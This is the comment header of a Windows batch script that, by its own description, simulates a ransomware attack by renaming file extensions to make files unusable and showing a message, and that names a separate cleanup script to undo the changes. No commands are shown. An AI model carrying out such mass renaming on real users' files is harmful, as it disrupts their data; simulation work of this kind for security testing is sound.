REM %%%%%%%%%%%%%    This script simulates a ransomware attack by changing file extensions and displays a message    %%%%%%%%%%%%%%
REM %%%%%%%%%%%%%       Renaming file extensions renders each file unusable until the proper extension is added      %%%%%%%%%%%%%%
REM %%%%%%%%%%%%%        Run (1.1)RansomwareSimulationCleanup to revert the changes and renaming of extensions       %%%%%%%%%%%%%%
